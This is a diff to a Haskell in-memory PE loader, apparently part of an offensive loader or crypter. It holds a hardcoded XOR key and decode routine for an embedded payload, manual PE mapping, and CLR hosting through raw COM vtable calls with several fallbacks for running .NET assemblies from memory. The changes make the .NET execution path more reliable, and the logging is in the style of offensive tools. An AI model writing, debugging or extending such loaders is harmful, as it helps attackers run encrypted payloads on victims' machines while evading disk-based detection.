@@ -381,14 +381,7 @@ clsid_CorRuntimeHost = GUID 0xCB2F6723 0xAB3A 0x11D2 [0x9C, 0x40, 0x00, 0xC0, 0x
 newtype ICLRRuntimeHost = ICLRRuntimeHost (Ptr ())
 newtype ICLRRuntimeHostVTable = ICLRRuntimeHostVTable (Ptr ICLRRuntimeHostVTable)
 
--- Use this for BOTH clsid_CLRRuntimeHost AND iid_ICLRRuntimeHost
--- in the context of the v4 GetInterface call.
-guid_ICLRRuntimeHost :: GUID
-guid_ICLRRuntimeHost = GUID 0x90F1A06C 0x7712 0x4762 [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02]
-
 -- Dynamic Wrappers for VTable Methods
--- Using Ptr () ensures correct register alignment on x64 and avoids type conflicts.
-
 foreign import ccall "dynamic"
   mkCLRQueryInterface :: FunPtr (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
                       -> (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
@@ -420,27 +413,6 @@ foreign import ccall "dynamic"
   mkDllMain :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32) 
             -> (Ptr () -> Word32 -> Ptr () -> IO Int32)
 
--- Accessors for ICLRRuntimeHostVTable methods
--- Updated Accessors to return Ptr () compatible FunPtrs
-pQueryInterface :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pQueryInterface ptr = peek (castPtr ptr `plusPtr` (0 * sizeOf (undefined :: FunPtr ())))
-
-pAddRef :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO ULONG))
-pAddRef ptr = peek (castPtr ptr `plusPtr` (1 * sizeOf (undefined :: FunPtr ())))
-
-pRelease :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO ULONG))
-pRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
-
--- Use castPtr to tell peekElemOff it is looking at an array of FunPtrs
-pStart :: Ptr (Ptr ()) -> IO (FunPtr (Ptr () -> IO HRESULT))
-pStart vtable = peekElemOff (castPtr vtable) 3
-
-pGetDefaultDomain :: Ptr (Ptr ()) -> IO (FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pGetDefaultDomain vtable = peekElemOff (castPtr vtable) 13
-
-pStop :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO HRESULT))
-pStop ptr = peek (castPtr ptr `plusPtr` (4 * sizeOf (undefined :: FunPtr ())))
-
 -- AppDomain GUID
 iid_AppDomain :: GUID
 iid_AppDomain = GUID 0x05F696DC 0x2B29 0x3663 [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xD7, 0x3A]
@@ -457,19 +429,6 @@ foreign import ccall "dynamic"
 foreign import ccall "dynamic"
   mkADPutApplicationBase :: FunPtr (Ptr AppDomain -> BSTR -> IO HRESULT)
                          -> (Ptr AppDomain -> BSTR -> IO HRESULT)
-
--- Accessors for AppDomainVTable methods
-pQueryInterface_AD :: Ptr AppDomainVTable -> IO (FunPtr (Ptr AppDomain -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pQueryInterface_AD ptr = peek (castPtr ptr `plusPtr` (0 * sizeOf (undefined :: FunPtr ())))
-
-pAddRef_AD :: Ptr AppDomainVTable -> IO (FunPtr (Ptr AppDomain -> IO ULONG))
-pAddRef_AD ptr = peek (castPtr ptr `plusPtr` (1 * sizeOf (undefined :: FunPtr ())))
-
-pRelease_AD :: Ptr AppDomainVTable -> IO (FunPtr (Ptr AppDomain -> IO ULONG))
-pRelease_AD ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
-
-pPutApplicationBase :: Ptr AppDomainVTable -> IO (FunPtr (Ptr AppDomain -> BSTR -> IO HRESULT))
-pPutApplicationBase ptr = peek (castPtr ptr `plusPtr` (3 * sizeOf (undefined :: FunPtr ())))
 
 type BSTR = Ptr WCHAR
 type WCHAR = Word16
@@ -512,8 +471,8 @@ foreign import ccall "dynamic"
                  -> (Ptr ICLRMetaHost -> Ptr WCHAR -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT)
 
 foreign import ccall "dynamic"
-  mkRIGetInterface :: FunPtr (Ptr () -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT)
-                   -> (Ptr () -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT)
+  mkRIGetInterface :: FunPtr (Ptr ICLRRuntimeInfo -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT)
+                   -> (Ptr ICLRRuntimeInfo -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT)
 
 foreign import ccall "dynamic"
   mkMHRelease :: FunPtr (Ptr ICLRMetaHost -> IO ULONG) -> (Ptr ICLRMetaHost -> IO ULONG)
@@ -525,17 +484,25 @@ secretKey :: BS.ByteString
 secretKey = BS.pack $ map (fromIntegral . fromEnum) "comp340659"
 
 -- VTable Accessors
-pGetRuntime :: Ptr ICLRMetaHostVTable -> IO (FunPtr (Ptr ICLRMetaHost -> Ptr WCHAR -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pGetRuntime ptr = peek (castPtr ptr `plusPtr` (3 * sizeOf (undefined :: FunPtr ())))
+pGetRuntime :: Ptr (Ptr ()) -> IO (FunPtr (Ptr ICLRMetaHost -> Ptr WCHAR -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
+pGetRuntime vtable = do
+  funcPtr <- peekElemOff vtable 3
+  return (castPtrToFunPtr funcPtr)
 
-pMHRelease :: Ptr ICLRMetaHostVTable -> IO (FunPtr (Ptr ICLRMetaHost -> IO ULONG))
-pMHRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
+pMHRelease :: Ptr (Ptr ()) -> IO (FunPtr (Ptr ICLRMetaHost -> IO ULONG))
+pMHRelease vtable = do
+  funcPtr <- peekElemOff vtable 2
+  return (castPtrToFunPtr funcPtr)
 
-pGetInterface :: Ptr ICLRRuntimeInfoVTable -> IO (FunPtr (Ptr ICLRRuntimeInfo -> Ptr GUID -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pGetInterface ptr = peek (castPtr ptr `plusPtr` (9 * sizeOf (undefined :: FunPtr ())))
+pGetInterface :: Ptr (Ptr ()) -> IO (FunPtr (Ptr ICLRRuntimeInfo -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT))
+pGetInterface vtable = do
+  funcPtr <- peekElemOff vtable 9
+  return (castPtrToFunPtr funcPtr)
 
-pRIRelease :: Ptr ICLRRuntimeInfoVTable -> IO (FunPtr (Ptr ICLRRuntimeInfo -> IO ULONG))
-pRIRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
+pRIRelease :: Ptr (Ptr ()) -> IO (FunPtr (Ptr ICLRRuntimeInfo -> IO ULONG))
+pRIRelease vtable = do
+  funcPtr <- peekElemOff vtable 2
+  return (castPtrToFunPtr funcPtr)
 
 -- Cyclic XOR decoding
 xorDecode :: BS.ByteString -> BS.ByteString -> BS.ByteString
@@ -545,60 +512,160 @@ xorDecode key target = BS.pack $ zipWith xor (BS.unpack target) (cycle (BS.unpac
 -- HELPER FUNCTIONS
 -- ============================================
 
-getCLRRuntimeHost :: IO (Maybe (Ptr ICLRRuntimeHost))
+-- Import CorBindToRuntimeEx for more reliable CLR loading
+foreign import ccall "mscoree.h CorBindToRuntimeEx"
+  c_CorBindToRuntimeEx :: Ptr WCHAR -> Ptr WCHAR -> Word32 -> Ptr GUID -> Ptr GUID -> Ptr (Ptr ()) -> IO HRESULT
+
+getCLRRuntimeHost :: IO (Maybe (Ptr ()))
 getCLRRuntimeHost = alloca $ \ppvHost -> do
+  putStrLn "[*] Attempting to load CLR..."
+  hFlush stdout
+  
+  -- Try Method 1: CLRCreateInstance (v4.0+)
+  result1 <- tryV4Method ppvHost
+  case result1 of
+    Just ptr -> return (Just ptr)
+    Nothing -> do
+      -- Try Method 2: CorBindToRuntimeEx (v2.0/v4.0 compatible)
+      putStrLn "[*] V4 method failed, trying CorBindToRuntimeEx..."
+      hFlush stdout
+      result2 <- tryCorBindMethod ppvHost
+      case result2 of
+        Just ptr -> return (Just ptr)
+        Nothing -> do
+          -- Try Method 3: Legacy CoCreateInstance
+          putStrLn "[*] CorBindToRuntimeEx failed, trying CoCreateInstance..."
+          hFlush stdout
+          tryLegacyMethod ppvHost
+
+tryV4Method :: Ptr (Ptr IUnknown) -> IO (Maybe (Ptr ()))
+tryV4Method ppvHost = do
   putStrLn "[*] Trying CLRCreateInstance (v4.0)..."
   hFlush stdout
   
-  -- Step 1: Get MetaHost
   alloca $ \ppvMeta -> do
     hrMeta <- with clsid_CLRMetaHost $ \clsid -> 
                 with iid_ICLRMetaHost $ \iid -> 
                   c_CLRCreateInstance clsid iid ppvMeta
     
-    if hrMeta < 0 then fallbackLegacy ppvHost else do
+    putStrLn $ "[*] CLRCreateInstance HRESULT: 0x" ++ showHex (fromIntegral hrMeta :: Word32) ""
+    hFlush stdout
+    
+    if hrMeta < 0 then return Nothing else do
       pMetaRaw <- peek ppvMeta
-      vtableMetaPtr <- peek (castPtr pMetaRaw) :: IO (Ptr (Ptr ()))
-      
-      -- Step 2: Get RuntimeInfo
-      alloca $ \ppvInfo -> do
-        pGetRuntimeFunc <- pGetRuntime (castPtr vtableMetaPtr)
-        -- Try a generic v4 string if specific version fails
-        verStr <- newCWString "v4.0.30319" 
-        hrRuntime <- with iid_ICLRRuntimeInfo $ \iid -> 
-           (unsafeCoerce mkMHGetRuntime) pGetRuntimeFunc pMetaRaw (castPtr verStr) iid ppvInfo
-        free verStr
-
-        if hrRuntime < 0 then fallbackLegacy ppvHost else do
-          pInfoRaw <- peek ppvInfo
-          vtableInfoPtr <- peek (castPtr pInfoRaw) :: IO (Ptr (Ptr ()))
-          pGetInterfaceFunc <- pGetInterface (castPtr vtableInfoPtr)
+      if pMetaRaw == nullPtr then do
+        putStrLn "[-] MetaHost pointer is NULL"
+        hFlush stdout
+        return Nothing
+      else do
+        putStrLn $ "[*] ICLRMetaHost at: 0x" ++ showHex (ptrToWordPtr pMetaRaw) ""
+        hFlush stdout
+        
+        vtableMetaPtr <- peek (castPtr pMetaRaw :: Ptr (Ptr (Ptr ())))
+        
+        alloca $ \ppvInfo -> do
+          pGetRuntimeFunc <- pGetRuntime vtableMetaPtr
+          verStr <- newCWString "v4.0.30319" 
           
-          -- Step 3: Get the actual Host
-          -- Using the "Double IID" trick to bypass registration issues
-          hrHost <- with iid_ICLRRuntimeHost $ \rclsid -> 
-                      with iid_ICLRRuntimeHost $ \riid ->
-                         (unsafeCoerce mkRIGetInterface) pGetInterfaceFunc pInfoRaw rclsid riid ppvHost
+          putStrLn "[*] Requesting CLR v4.0.30319..."
+          hFlush stdout
+          
+          hrRuntime <- with iid_ICLRRuntimeInfo $ \iid -> do
+            let metaHost = castPtr pMetaRaw :: Ptr ICLRMetaHost
+            mkMHGetRuntime pGetRuntimeFunc metaHost (castPtr verStr) iid ppvInfo
+          
+          free verStr
+          
+          putStrLn $ "[*] GetRuntime HRESULT: 0x" ++ showHex (fromIntegral hrRuntime :: Word32) ""
+          hFlush stdout
 
-          -- Ensure getCLRRuntimeHost looks like this at the end of the V4 path:
-          if hrHost < 0 
-            then return Nothing 
+          if hrRuntime < 0 then return Nothing else do
+            pInfoRaw <- peek ppvInfo
+            if pInfoRaw == nullPtr then do
+              putStrLn "[-] RuntimeInfo pointer is NULL"
+              hFlush stdout
+              return Nothing
             else do
-              hostPtr <- peek ppvHost -- Dereference the allocated pointer
-              putStrLn "[+] Successfully bound to ICLRRuntimeHost v4"
-              return (Just (castPtr hostPtr)) -- Return the ACTUAL address
+              putStrLn $ "[*] ICLRRuntimeInfo at: 0x" ++ showHex (ptrToWordPtr pInfoRaw) ""
+              hFlush stdout
+              
+              vtableInfoPtr <- peek (castPtr pInfoRaw :: Ptr (Ptr (Ptr ())))
+              pGetInterfaceFunc <- pGetInterface vtableInfoPtr
+              
+              -- Try GetInterface with the proper CLSID
+              putStrLn "[*] Getting ICLRRuntimeHost interface..."
+              hFlush stdout
+              
+              hrHost <- with iid_ICLRRuntimeHost $ \rclsid -> 
+                          with iid_ICLRRuntimeHost $ \riid -> do
+                            let runtimeInfo = castPtr pInfoRaw :: Ptr ICLRRuntimeInfo
+                            mkRIGetInterface pGetInterfaceFunc runtimeInfo rclsid riid (castPtr ppvHost)
+              
+              putStrLn $ "[*] GetInterface HRESULT: 0x" ++ showHex (fromIntegral hrHost :: Word32) ""
+              hFlush stdout
 
-   where
-    fallbackLegacy ppv = do
-      putStrLn "[!] v4 path failed, attempting v2.0 legacy fallback..."
-      with clsid_CorRuntimeHost $ \pClsid ->
-        with iid_ICLRRuntimeHost $ \pIid -> do
-          hr <- c_CoCreateInstance pClsid nullPtr 1 pIid ppv
-          if hr < 0 
-            then return Nothing -- Match the Maybe type
-            else do
-              ptr <- peek ppv
-              return (Just (castPtr ptr)) -- Match the Maybe type
+              if hrHost < 0 then return Nothing else do
+                hostPtr <- peek ppvHost
+                let hostPtr' = castPtr hostPtr :: Ptr ()
+                if hostPtr' == nullPtr
+                  then do
+                    putStrLn "[-] Host pointer is NULL"
+                    hFlush stdout
+                    return Nothing
+                  else do
+                    putStrLn $ "[+] Successfully got ICLRRuntimeHost at: 0x" ++ showHex (ptrToWordPtr hostPtr') ""
+                    hFlush stdout
+                    return (Just hostPtr')
+
+tryCorBindMethod :: Ptr (Ptr IUnknown) -> IO (Maybe (Ptr ()))
+tryCorBindMethod ppvHost = do
+  verStr <- newCWString "v4.0.30319"
+  flavorStr <- newCWString "wks"  -- workstation flavor
+  
+  hrBind <- with iid_ICLRRuntimeHost $ \riid ->
+    c_CorBindToRuntimeEx (castPtr verStr) (castPtr flavorStr) 0 riid riid (castPtr ppvHost)
+  
+  free verStr
+  free flavorStr
+  
+  putStrLn $ "[*] CorBindToRuntimeEx HRESULT: 0x" ++ showHex (fromIntegral hrBind :: Word32) ""
+  hFlush stdout
+  
+  if hrBind < 0
+    then return Nothing
+    else do
+      hostPtr <- peek ppvHost
+      let hostPtr' = castPtr hostPtr :: Ptr ()
+      if hostPtr' == nullPtr
+        then return Nothing
+        else do
+          putStrLn $ "[+] Got CLR host via CorBindToRuntimeEx at: 0x" ++ showHex (ptrToWordPtr hostPtr') ""
+          hFlush stdout
+          return (Just hostPtr')
+
+tryLegacyMethod :: Ptr (Ptr IUnknown) -> IO (Maybe (Ptr ()))
+tryLegacyMethod ppvHost = do
+  putStrLn "[!] Attempting legacy CoCreateInstance..."
+  hFlush stdout
+  
+  hrCom <- with clsid_CorRuntimeHost $ \pClsid ->
+    with iid_ICLRRuntimeHost $ \pIid ->
+      c_CoCreateInstance pClsid nullPtr 1 pIid ppvHost
+  
+  putStrLn $ "[*] CoCreateInstance HRESULT: 0x" ++ showHex (fromIntegral hrCom :: Word32) ""
+  hFlush stdout
+  
+  if hrCom < 0 
+    then return Nothing
+    else do
+      ptr <- peek ppvHost
+      let ptr' = castPtr ptr :: Ptr ()
+      if ptr' == nullPtr
+        then return Nothing
+        else do
+          putStrLn $ "[+] Got legacy host at: 0x" ++ showHex (ptrToWordPtr ptr') ""
+          hFlush stdout
+          return (Just ptr')
   
 getDataDirectory :: Ptr ImageNtHeaders64 -> Int -> IO (Ptr ImageDataDirectory)
 getDataDirectory ntPtr index = do
@@ -832,44 +899,75 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       putStrLn "[*] Detected .NET assembly. Attempting to load CLR."
       hFlush stdout
 
-      _ <- c_CoInitializeEx nullPtr 0 
+      -- Initialize COM with proper error handling
+      hrCom <- c_CoInitializeEx nullPtr 0
+      when (hrCom < 0 && hrCom /= (-2147417850)) $  -- S_FALSE = already initialized
+        error $ "[-] COM initialization failed: HRESULT = 0x" ++ showHex (fromIntegral hrCom :: Word32) ""
       putStrLn "[*] COM initialized."
+      hFlush stdout
       
       maybeHost <- getCLRRuntimeHost
       case maybeHost of
-        Nothing -> error "[-] Critical Error: ICLRRuntimeHost is NULL."
-        Just pRaw -> do
-          let instancePtr = castPtr pRaw
+        Nothing -> error "[-] Critical Error: Failed to obtain ICLRRuntimeHost interface."
+        Just hostPtr -> do
+          -- Validate the host pointer
+          when (hostPtr == nullPtr) $
+            error "[-] ICLRRuntimeHost pointer is NULL"
           
-          -- 1. Get the VTable address
-          vtableAddr <- peek (castPtr instancePtr) :: IO (Ptr (Ptr ()))
+          putStrLn $ "[*] ICLRRuntimeHost interface at: 0x" ++ showHex (ptrToWordPtr hostPtr) ""
+          hFlush stdout
           
-          -- 2. Extract and CAST the Start function (Index 3)
-          pStartRaw <- peekElemOff vtableAddr 3
-          let pStartFuncPtr = castPtrToFunPtr pStartRaw
+          -- Dereference to get the VTable
+          vtablePtr <- peek (castPtr hostPtr :: Ptr (Ptr (Ptr ())))
+          putStrLn $ "[*] VTable address: 0x" ++ showHex (ptrToWordPtr vtablePtr) ""
+          hFlush stdout
           
-          -- 3. Call Start (Now the types match: FunPtr vs Ptr)
-          hrStart <- mkCLRStart pStartFuncPtr instancePtr
+          -- Get the Start method function pointer (index 3 in VTable)
+          pStartRaw <- peekElemOff vtablePtr 3
+          let pStartFunc = castPtrToFunPtr pStartRaw :: FunPtr (Ptr () -> IO HRESULT)
+          
+          -- Call Start method - IMPORTANT: Pass hostPtr (the interface pointer), not vtablePtr
+          putStrLn "[*] Calling ICLRRuntimeHost::Start()..."
+          hFlush stdout
+          hrStart <- mkCLRStart pStartFunc hostPtr
           
           if hrStart < 0 
-            then error "CLR Start failed"
-            else putStrLn "[+] CLR Started."
-
-          -- 4. AppDomain Logic
+            then error $ "[-] CLR Start failed: HRESULT = 0x" ++ showHex (fromIntegral hrStart :: Word32) ""
+            else putStrLn "[+] CLR started successfully."
+          hFlush stdout
+          
+          -- Get default AppDomain
           alloca $ \ppvDomain -> do
-            -- Extract and CAST GetDefaultDomain (Index 13)
-            pGetDomainRaw <- peekElemOff vtableAddr 13
-            let pGetDomainFunc = castPtrToFunPtr pGetDomainRaw
+            -- Get GetDefaultDomain method (index 13 in VTable)
+            pGetDomainRaw <- peekElemOff vtablePtr 13
+            let pGetDomainFunc = castPtrToFunPtr pGetDomainRaw :: FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT)
             
-            _ <- mkCLRGetDefaultDomain pGetDomainFunc instancePtr ppvDomain
+            putStrLn "[*] Calling ICLRRuntimeHost::GetDefaultDomain()..."
+            hFlush stdout
+            hrDomain <- mkCLRGetDefaultDomain pGetDomainFunc hostPtr ppvDomain
+            
+            if hrDomain < 0
+              then error $ "[-] GetDefaultDomain failed: HRESULT = 0x" ++ showHex (fromIntegral hrDomain :: Word32) ""
+              else putStrLn "[+] Successfully obtained default AppDomain."
+            hFlush stdout
             
             pAppDomain <- peek ppvDomain
-            let appDomainRaw = castPtr pAppDomain
+            when (pAppDomain == nullPtr) $
+              error "[-] AppDomain pointer is NULL"
             
-            -- Call the entry point
-            putStrLn "[*] Calling _CorExeMain..."
-            _ <- c_CorExeMain imageBase
-            return ()
+            putStrLn $ "[*] AppDomain interface at: 0x" ++ showHex (ptrToWordPtr pAppDomain) ""
+            hFlush stdout
+            
+            -- Call _CorExeMain to execute the .NET assembly
+            putStrLn "[*] Calling _CorExeMain()..."
+            hFlush stdout
+            exitCode <- c_CorExeMain imageBase
+            putStrLn $ "[*] _CorExeMain returned with exit code: " ++ show exitCode
+            hFlush stdout
+            
+            -- Cleanup (optional, but good practice)
+            putStrLn "[*] .NET assembly execution completed."
+            hFlush stdout
     else do
       -- NATIVE PE LOADING
       optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
@@ -933,10 +1031,8 @@ main = do
   putStrLn "[*] Attempting to load PE from memory..."
   hFlush stdout
 
-  -- [FIXED]: Added explicit timeout call and separated the case statement clearly
   maybeResult <- timeout loaderTimeoutMicros (try (loadPEFromMemory peBytes) :: IO (Either SomeException ()))
   
-  -- The case statement must be aligned at the same level as maybeResult
   case maybeResult of
     Nothing -> do
       putStrLn $ "[!] PE loader timed out after " ++ show (loaderTimeoutMicros `div` 1000000) ++ " seconds."
